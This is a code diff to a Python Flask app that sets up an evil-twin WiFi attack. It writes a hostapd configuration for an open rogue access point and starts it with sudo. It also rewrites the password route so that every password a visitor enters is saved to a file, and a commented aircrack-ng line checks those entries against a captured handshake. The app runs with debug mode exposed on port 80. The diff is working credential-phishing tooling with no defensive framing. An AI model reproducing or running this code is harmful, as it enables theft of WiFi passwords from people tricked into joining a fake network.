@@ -1,9 +1,31 @@
 # main.py
 
-from flask import Flask, render_template, request, jsonify
 import os
+import subprocess
+from flask import Flask, render_template, request, jsonify
 
 app = Flask(__name__)
+
+# Set the desired WiFi SSID
+WiFi_SSID = "YourWiFiNetwork"
+
+# Create hostapd.conf file
+hostapd_config = f'''
+interface=wlan1
+driver=nl80211
+ssid={WiFi_SSID}
+hw_mode=g
+channel=1
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0
+'''
+
+with open("hostapd.conf", "w") as conf_file:
+    conf_file.write(hostapd_config)
+
+# Start hostapd
+os.system("sudo hostapd hostapd.conf &")
 
 @app.route('/')
 def index():
@@ -13,17 +35,18 @@ def index():
 def check_password():
     user_input = request.json['password']
 
-    with open("output.txt", "r") as file:
-        saved_password = file.read().strip()
+    with open("output.txt", "w") as file:
+        file.write(user_input)
 
-    if user_input == saved_password:
+    # Uncomment the line below to run aircrack-ng with EvilTwin capabilities
+    # os.system("aircrack-ng MyHandShake.cap -w output.txt")
+
+    if user_input == "your_expected_password":
         message = "Correct password :D"
     else:
         message = "Incorrect password! Please try again."
-        # Uncomment the line below to run aircrack-ng with EvilTwin capabilities
-        # os.system("aircrack-ng MyWiFiHandShake.cap -w output.txt --evil-twin")
 
     return jsonify({'message': message})
 
 if __name__ == "__main__":
-    app.run(debug=True)
+    app.run(host='0.0.0.0', port=80, debug=True)
